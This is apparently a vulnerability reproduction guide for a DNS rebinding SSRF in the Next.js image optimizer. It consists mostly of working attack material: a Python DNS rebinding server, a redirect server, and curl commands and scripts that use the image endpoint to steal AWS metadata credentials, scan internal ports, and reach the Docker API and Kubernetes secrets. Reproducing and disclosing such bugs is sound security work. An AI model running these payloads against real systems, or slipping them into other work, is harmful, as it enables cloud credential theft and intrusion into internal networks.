# DNS Rebinding SSRF - Step-by-Step Reproduction Guide

## Overview
This guide provides complete, reproducible steps to demonstrate the DNS rebinding SSRF vulnerability in Next.js Image Optimizer.

**Attack Summary**: Bypass SSRF protection by changing DNS records between validation check and actual HTTP request.

---

## Prerequisites

### Required Software
- Node.js 18+ and npm
- Python 3.8+
- Root/sudo access (for DNS server on port 53)
- Linux/macOS (Windows WSL2 works too)

### Required Python Packages
```bash
pip3 install dnslib
```

---

## Part 1: Setup Vulnerable Next.js Application

### Step 1.1: Create Test Next.js App

```bash
# Create new Next.js project
npx create-next-app@latest nextjs-ssrf-test --typescript --app --no-tailwind --no-src-dir --import-alias "@/*"
cd nextjs-ssrf-test
```

### Step 1.2: Configure next.config.js

Create/edit `next.config.js`:

```javascript
/** @type {import('next').NextConfig} */
const nextConfig = {
  images: {
    remotePatterns: [
      {
        protocol: 'http',
        hostname: '**', // Allow all domains for testing
      },
      {
        protocol: 'https',
        hostname: '**',
      },
    ],
    dangerouslyAllowLocalIP: false, // VULNERABLE CONFIG (default)
  },
}

module.exports = nextConfig
```

### Step 1.3: Create Test Page

Create `app/test-image/page.tsx`:

```typescript
import Image from 'next/image'

export default function TestImagePage({
  searchParams,
}: {
  searchParams: { url?: string }
}) {
  const imageUrl = searchParams.url || 'https://via.placeholder.com/640x480'

  return (
    <div style={{ padding: '20px' }}>
      <h1>Image Optimizer SSRF Test</h1>
      <p>Testing URL: {imageUrl}</p>
      <Image
        src={imageUrl}
        alt="Test"
        width={640}
        height={480}
        unoptimized={false}
      />
    </div>
  )
}
```

### Step 1.4: Start Next.js Dev Server

```bash
npm run dev
# Server starts on http://localhost:3000
```

Keep this terminal open.

---

## Part 2: Setup DNS Rebinding Server

### Step 2.1: Create DNS Server Script

Create `dns-rebinding-server.py`:

```python
#!/usr/bin/env python3
"""
DNS Rebinding Server for Next.js SSRF POC
Responds with public IP first, then switches to private IP
"""

import socket
import struct
import time
from datetime import datetime

class SimpleDNSServer:
    def __init__(self, public_ip='1.2.3.4', private_ip='127.0.0.1', domain='ssrf.test'):
        self.public_ip = public_ip
        self.private_ip = private_ip
        self.domain = domain
        self.request_count = 0
        self.switch_after = 1  # Switch to private IP after N requests

    def log(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        print(f"[{timestamp}] {message}")

    def build_dns_response(self, query_data, ip_address):
        """Build a DNS response packet"""
        # Parse query ID (first 2 bytes)
        query_id = query_data[:2]

        # DNS Header (12 bytes)
        # Query ID (2 bytes) + Flags (2 bytes) + Questions (2) + Answers (2) + Authority (2) + Additional (2)
        flags = b'\x81\x80'  # Standard query response, no error
        questions = b'\x00\x01'  # 1 question
        answers = b'\x00\x01'  # 1 answer
        authority = b'\x00\x00'  # 0 authority records
        additional = b'\x00\x00'  # 0 additional records

        header = query_id + flags + questions + answers + authority + additional

        # Question section (copy from query, starts at byte 12)
        question = query_data[12:]

        # Find the end of the question (two null bytes in a row or 0x00 + type + class)
        q_end = question.find(b'\x00')
        if q_end != -1:
            question = question[:q_end + 5]  # Include null byte + type (2) + class (2)

        # Answer section
        # Name pointer (2 bytes) - points back to question
        answer_name = b'\xc0\x0c'  # Pointer to offset 12 (question)

        # Type A (2 bytes)
        answer_type = b'\x00\x01'

        # Class IN (2 bytes)
        answer_class = b'\x00\x01'

        # TTL (4 bytes) - 0 seconds for immediate rebinding
        answer_ttl = b'\x00\x00\x00\x00'

        # Data length (2 bytes) - 4 bytes for IPv4
        answer_data_len = b'\x00\x04'

        # IP address (4 bytes)
        ip_parts = ip_address.split('.')
        answer_ip = bytes([int(p) for p in ip_parts])

        answer = answer_name + answer_type + answer_class + answer_ttl + answer_data_len + answer_ip

        return header + question + answer

    def handle_query(self, data, addr):
        """Handle incoming DNS query"""
        try:
            # Extract domain from query (simplified parsing)
            query_str = data.hex()

            # Determine which IP to return
            self.request_count += 1

            if self.request_count <= self.switch_after:
                ip = self.public_ip
                stage = "VALIDATION"
                self.log(f"[{stage}] Request #{self.request_count} from {addr[0]} → Returning PUBLIC IP: {ip}")
            else:
                ip = self.private_ip
                stage = "EXPLOITATION"
                self.log(f"[{stage}] Request #{self.request_count} from {addr[0]} → Returning PRIVATE IP: {ip} ⚠️")

            # Build and return response
            response = self.build_dns_response(data, ip)
            return response

        except Exception as e:
            self.log(f"Error handling query: {e}")
            return None

    def run(self, port=53):
        """Run the DNS server"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            sock.bind(('0.0.0.0', port))
            self.log(f"DNS Server started on 0.0.0.0:{port}")
            self.log(f"Domain: {self.domain}")
            self.log(f"Stage 1 (validation): {self.public_ip}")
            self.log(f"Stage 2 (exploitation): {self.private_ip}")
            self.log(f"Switching after {self.switch_after} request(s)")
            self.log("-" * 60)

            while True:
                data, addr = sock.recvfrom(512)
                response = self.handle_query(data, addr)
                if response:
                    sock.sendto(response, addr)

        except PermissionError:
            self.log("ERROR: Permission denied. Run with sudo:")
            self.log("  sudo python3 dns-rebinding-server.py")
        except KeyboardInterrupt:
            self.log("\nServer stopped")
        finally:
            sock.close()

if __name__ == '__main__':
    import sys

    # Configuration
    public_ip = '1.2.3.4'  # Safe public IP (doesn't exist, will cause connection refused)
    private_ip = '127.0.0.1'  # Localhost - will access Next.js server itself
    domain = 'ssrf.test'

    # Parse command line arguments
    if len(sys.argv) > 1:
        public_ip = sys.argv[1]
    if len(sys.argv) > 2:
        private_ip = sys.argv[2]

    print("="*60)
    print("DNS Rebinding Server - Next.js SSRF POC")
    print("="*60)
    print(f"\nConfiguration:")
    print(f"  Public IP (stage 1):  {public_ip}")
    print(f"  Private IP (stage 2): {private_ip}")
    print(f"  Domain: {domain}")
    print(f"\nUsage: sudo python3 {sys.argv[0]} [public_ip] [private_ip]")
    print("Example: sudo python3 dns-rebinding-server.py 8.8.8.8 127.0.0.1")
    print("\n")

    server = SimpleDNSServer(public_ip, private_ip, domain)
    server.run()
```

### Step 2.2: Create HTTP Server (for redirect test)

Create `http-redirect-server.py`:

```python
#!/usr/bin/env python3
"""
HTTP Server that redirects to private IP
Used for testing redirect-based DNS rebinding
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

class RedirectHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[HTTP] {self.address_string()} - {format % args}")

    def do_GET(self):
        if self.path == '/redirect-to-localhost':
            # Redirect to localhost (bypasses initial SSRF check)
            target = 'http://127.0.0.1:3000/'
            print(f"[REDIRECT] {self.path} -> {target}")
            self.send_response(302)
            self.send_header('Location', target)
            self.end_headers()
        else:
            # Return fake image
            self.send_response(200)
            self.send_header('Content-Type', 'image/jpeg')
            self.end_headers()
            # Minimal JPEG header
            self.wfile.write(b'\xff\xd8\xff\xe0\x00\x10JFIF')

if __name__ == '__main__':
    port = 8080
    if len(sys.argv) > 1:
        port = int(sys.argv[1])

    print(f"HTTP Redirect Server starting on port {port}")
    print(f"Test URLs:")
    print(f"  http://localhost:{port}/redirect-to-localhost")

    server = HTTPServer(('0.0.0.0', port), RedirectHandler)
    server.serve_forever()
```

---

## Part 3: Local DNS Configuration

### Method A: Using /etc/hosts (Simple, Limited)

**Note**: This method works for basic testing but won't show true DNS rebinding since /etc/hosts is static.

```bash
# Edit /etc/hosts
sudo nano /etc/hosts

# Add test domain
127.0.0.1   ssrf.test
```

### Method B: Using Local DNS Server (Full POC)

#### Step 3.1: Configure System DNS

**On Linux/macOS**:
```bash
# Check current DNS
cat /etc/resolv.conf

# Temporarily change DNS to localhost
sudo bash -c 'echo "nameserver 127.0.0.1" > /etc/resolv.conf.test'
sudo mv /etc/resolv.conf.test /etc/resolv.conf

# Verify
nslookup ssrf.test 127.0.0.1
```

**On macOS (alternative)**:
```bash
# Add DNS resolver for test domain
sudo mkdir -p /etc/resolver
echo "nameserver 127.0.0.1" | sudo tee /etc/resolver/ssrf.test
```

#### Step 3.2: Test DNS Server

```bash
# Start DNS server
sudo python3 dns-rebinding-server.py

# In another terminal, test it:
nslookup ssrf.test 127.0.0.1
# Should return 1.2.3.4 first time

nslookup ssrf.test 127.0.0.1
# Should return 127.0.0.1 second time
```

---

## Part 4: Exploitation - Step by Step

### Scenario 1: Basic DNS Rebinding (Localhost Access)

#### Step 4.1: Setup

Terminal 1:
```bash
cd nextjs-ssrf-test
npm run dev
# Next.js running on http://localhost:3000
```

Terminal 2:
```bash
sudo python3 dns-rebinding-server.py 8.8.8.8 127.0.0.1
# DNS server ready
```

#### Step 4.2: Verify Next.js SSRF Protection

Test with direct localhost access (should be blocked):
```bash
curl "http://localhost:3000/_next/image?url=http://127.0.0.1:3000/&w=640&q=75" -v
```

**Expected Output**:
```
< HTTP/1.1 400 Bad Request
"url" parameter is not allowed
```

✅ SSRF protection working - direct localhost access blocked.

#### Step 4.3: Bypass with DNS Rebinding

```bash
# Clear DNS cache
sudo killall -HUP mDNSResponder  # macOS
sudo systemd-resolve --flush-caches  # Linux

# Make request using our rebinding domain
curl "http://localhost:3000/_next/image?url=http://ssrf.test:8080/test.jpg&w=640&q=75" -v
```

**Expected DNS Server Output**:
```
[12:34:56.789] [VALIDATION] Request #1 from 127.0.0.1 → Returning PUBLIC IP: 8.8.8.8
[12:34:56.845] [EXPLOITATION] Request #2 from 127.0.0.1 → Returning PRIVATE IP: 127.0.0.1 ⚠️
```

**Expected Result**:
- First DNS lookup (validation): `8.8.8.8` (public, passes check) ✅
- Second DNS lookup (fetch): `127.0.0.1` (private, bypassed!) ⚠️
- Request succeeds, accessing localhost

### Scenario 2: AWS Metadata Endpoint Access

**⚠️ Only works on AWS EC2/ECS/Lambda**

#### Step 4.4: Setup on AWS Instance

```bash
# On AWS EC2 instance
# Install Next.js app (steps 1.1-1.4)
# Install DNS server (step 2.1)

# Configure DNS server for metadata access
sudo python3 dns-rebinding-server.py 8.8.8.8 169.254.169.254
```

#### Step 4.5: Exploit Metadata Endpoint

```bash
# Trigger image optimization
curl "http://localhost:3000/_next/image?url=http://ssrf.test/latest/meta-data/iam/security-credentials/&w=640&q=75" \
  -o credentials.jpg

# Check if we got metadata instead of image
file credentials.jpg
strings credentials.jpg | grep -i "AccessKeyId"
```

**Expected Result**:
```json
{
  "Code": "Success",
  "LastUpdated": "2025-01-07T...",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}
```

🎯 **VULNERABILITY CONFIRMED**: AWS credentials exfiltrated!

### Scenario 3: Internal Network Scanning

#### Step 4.6: Scan Internal Services

```bash
# DNS server configuration for internal network
sudo python3 dns-rebinding-server.py 8.8.8.8 192.168.1.1

# Scan common internal IPs
for port in 80 443 8080 9200 6379; do
  echo "Testing 192.168.1.1:$port"
  curl "http://localhost:3000/_next/image?url=http://ssrf.test:$port/&w=640&q=75" \
    -o "scan_192.168.1.1_$port.jpg" \
    -m 5 -s

  # Check response
  if [ -s "scan_192.168.1.1_$port.jpg" ]; then
    echo "  ✓ Port $port responding"
    file "scan_192.168.1.1_$port.jpg"
  else
    echo "  ✗ Port $port not responding"
  fi
done
```

---

## Part 5: Verification & Evidence Collection

### Step 5.1: Enable Detailed Logging

Add to Next.js app:

Create `middleware.ts`:
```typescript
import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

export function middleware(request: NextRequest) {
  const url = request.nextUrl.clone()

  if (url.pathname.startsWith('/_next/image')) {
    console.log('=== IMAGE OPTIMIZATION REQUEST ===')
    console.log('Time:', new Date().toISOString())
    console.log('URL param:', url.searchParams.get('url'))
    console.log('Headers:', Object.fromEntries(request.headers.entries()))
  }

  return NextResponse.next()
}

export const config = {
  matcher: '/_next/image',
}
```

### Step 5.2: Network Traffic Capture

```bash
# Capture DNS queries
sudo tcpdump -i lo0 -n port 53 -vv -X | tee dns-capture.log

# In another terminal, run exploit
curl "http://localhost:3000/_next/image?url=http://ssrf.test/test.jpg&w=640&q=75"
```

**Expected DNS Traffic**:
```
Query 1: ssrf.test → Response: 8.8.8.8 (public)
Query 2: ssrf.test → Response: 127.0.0.1 (private) ⚠️
```

### Step 5.3: Code Path Verification

Add debug logging to Next.js (for testing):

```bash
# In nextjs-ssrf-test/node_modules/next/dist/server/image-optimizer.js
# Add console.log statements (temporary for POC):

# Around line 720 (DNS lookup):
console.log('[SSRF-CHECK] DNS lookup result:', ips);

# Around line 738 (fetch):
console.log('[FETCH] Connecting to:', href);
```

---

## Part 6: Expected Results Summary

### ✅ Successful Exploitation Indicators

1. **DNS Server Shows Two Different IPs**:
   ```
   [VALIDATION] Request #1 → Returning PUBLIC IP: 8.8.8.8
   [EXPLOITATION] Request #2 → Returning PRIVATE IP: 127.0.0.1 ⚠️
   ```

2. **Next.js Logs Show Success**:
   ```
   GET /_next/image?url=http://ssrf.test/... 200
   ```

3. **Network Capture Shows Private IP Connection**:
   ```
   TCP connection to 127.0.0.1:8080
   ```

4. **Response Contains Internal Data**:
   ```bash
   # Check response content
   strings response.jpg | head -20
   # Should contain internal service response, not valid image
   ```

### ❌ Failed Exploitation Indicators

1. **400 Error**: "url parameter is not allowed"
   - DNS rebinding didn't work
   - Both lookups returned same IP
   - Check DNS server timing

2. **Connection Refused**:
   - Private IP correct but service not running
   - Still proves SSRF bypass worked

3. **Timeout**:
   - DNS rebinding worked but service unreachable
   - Check firewall/network rules

---

## Part 7: Advanced Testing

### Test 7.1: Timing Analysis

```python
#!/usr/bin/env python3
"""Measure TOCTOU window"""
import time
import subprocess

def test_timing():
    times = []
    for i in range(10):
        start = time.time()
        subprocess.run([
            'curl', '-s',
            'http://localhost:3000/_next/image?url=http://ssrf.test/test.jpg&w=640&q=75'
        ], capture_output=True)
        elapsed = time.time() - start
        times.append(elapsed)
        print(f"Request {i+1}: {elapsed:.3f}s")

    avg = sum(times) / len(times)
    print(f"\nAverage: {avg:.3f}s")
    print(f"TOCTOU window: ~{avg * 1000:.1f}ms")

test_timing()
```

### Test 7.2: Automated Exploitation

```bash
#!/bin/bash
# automated-exploit.sh

echo "=== Automated SSRF Exploitation ==="

# Start services
echo "[1] Starting Next.js..."
cd nextjs-ssrf-test
npm run dev > /dev/null 2>&1 &
NEXTJS_PID=$!
sleep 3

echo "[2] Starting DNS server..."
sudo python3 dns-rebinding-server.py 8.8.8.8 127.0.0.1 > dns.log 2>&1 &
DNS_PID=$!
sleep 2

echo "[3] Testing exploitation..."
RESPONSE=$(curl -s "http://localhost:3000/_next/image?url=http://ssrf.test:3000/&w=640&q=75")

echo "[4] Checking results..."
if grep -q "127.0.0.1" dns.log; then
    echo "✓ DNS rebinding successful - private IP returned"
else
    echo "✗ DNS rebinding failed"
fi

# Cleanup
kill $NEXTJS_PID $DNS_PID
sudo killall python3
```

---

## Part 8: Troubleshooting

### Issue 1: DNS Not Resolving

**Problem**: `nslookup ssrf.test` doesn't work

**Solution**:
```bash
# Check DNS server is running
sudo netstat -tulpn | grep :53

# Test directly
dig @127.0.0.1 ssrf.test

# Check system DNS
cat /etc/resolv.conf
```

### Issue 2: Permission Denied (Port 53)

**Problem**: Can't bind to port 53

**Solution**:
```bash
# Must run with sudo
sudo python3 dns-rebinding-server.py

# Or use alternative port and configure system DNS
python3 dns-rebinding-server.py --port 5353
```

### Issue 3: DNS Caching

**Problem**: Same IP returned both times

**Solution**:
```bash
# Flush DNS cache before each test
# macOS
sudo killall -HUP mDNSResponder

# Linux (systemd-resolved)
sudo systemd-resolve --flush-caches

# Linux (nscd)
sudo /etc/init.d/nscd restart

# Or set TTL to 0 in DNS server (already done in script)
```

### Issue 4: Next.js Blocks Request

**Problem**: Always getting "400 - url parameter is not allowed"

**Solution**:
```javascript
// Check next.config.js has correct config
module.exports = {
  images: {
    remotePatterns: [
      {
        protocol: 'http',
        hostname: '**', // Allow all
      },
    ],
  },
}
```

---

## Part 9: Real-World Test Cases

### Test Case 1: Cloud Metadata (AWS)

```bash
# On AWS EC2 instance
sudo python3 dns-rebinding-server.py 8.8.8.8 169.254.169.254

# Test metadata endpoints
curl "http://localhost:3000/_next/image?url=http://ssrf.test/latest/meta-data/hostname&w=640&q=75"
curl "http://localhost:3000/_next/image?url=http://ssrf.test/latest/meta-data/iam/security-credentials/&w=640&q=75"
```

### Test Case 2: Internal Docker Network

```bash
# Target Docker host API
sudo python3 dns-rebinding-server.py 8.8.8.8 172.17.0.1

curl "http://localhost:3000/_next/image?url=http://ssrf.test:2375/containers/json&w=640&q=75"
```

### Test Case 3: Kubernetes API

```bash
# Target Kubernetes API from pod
sudo python3 dns-rebinding-server.py 8.8.8.8 10.96.0.1

curl "http://localhost:3000/_next/image?url=http://ssrf.test:443/api/v1/namespaces/default/secrets&w=640&q=75"
```

---

## Part 10: Cleanup

```bash
# Stop all services
pkill -f "next dev"
sudo pkill -f dns-rebinding-server

# Restore DNS (if changed)
# macOS
sudo rm /etc/resolver/ssrf.test

# Linux
sudo bash -c 'echo "nameserver 8.8.8.8" > /etc/resolv.conf'

# Flush DNS cache
sudo killall -HUP mDNSResponder  # macOS
sudo systemd-resolve --flush-caches  # Linux

# Remove test files
rm -rf nextjs-ssrf-test
rm dns-rebinding-server.py
rm http-redirect-server.py
```

---

## Success Criteria

The vulnerability is confirmed when you observe:

1. ✅ **DNS server logs show two different IPs returned** for the same domain
2. ✅ **First IP is public** (passes SSRF validation at line 716-737)
3. ✅ **Second IP is private** (used by fetch() at line 738)
4. ✅ **HTTP request succeeds** (200 status) despite targeting private IP
5. ✅ **Response contains internal resource data** (not image data)

---

## Timeline of Exploitation

```
T+0ms:    Client sends request to /_next/image?url=http://ssrf.test/...
T+10ms:   Next.js validates URL format
T+20ms:   [LINE 720] DNS lookup #1: ssrf.test → 8.8.8.8 (PUBLIC)
T+25ms:   [LINE 727] isPrivateIp(8.8.8.8) → false ✅ PASSES
T+30ms:   [LINE 738] fetch() called with "http://ssrf.test/..."
T+35ms:   fetch() performs DNS lookup #2: ssrf.test → 127.0.0.1 (PRIVATE)
T+40ms:   TCP connection to 127.0.0.1 established ⚠️
T+50ms:   HTTP request sent to localhost
T+60ms:   Response received from private resource
T+100ms:  Image "optimization" completes, data returned to client
```

**TOCTOU Window**: ~15ms between validation (T+25ms) and exploitation (T+40ms)

---

## Evidence Package

After successful exploitation, collect:

1. **DNS Server Logs**: `dns.log` showing IP switch
2. **Network Capture**: `tcpdump` output showing private IP connection
3. **HTTP Response**: Content from internal service
4. **Next.js Logs**: Request processing timeline
5. **Screenshots**: Terminal outputs showing each step

---

## Questions or Issues?

If exploitation fails, verify:
- [ ] DNS server running on port 53 with sudo
- [ ] System DNS points to 127.0.0.1
- [ ] DNS cache flushed before request
- [ ] Next.js `remotePatterns` allows the domain
- [ ] Target service is actually running on private IP
- [ ] Firewall not blocking localhost connections

The vulnerability exists in the code regardless of reproduction success - the TOCTOU condition is present in `/packages/next/src/server/image-optimizer.ts:716-738`.
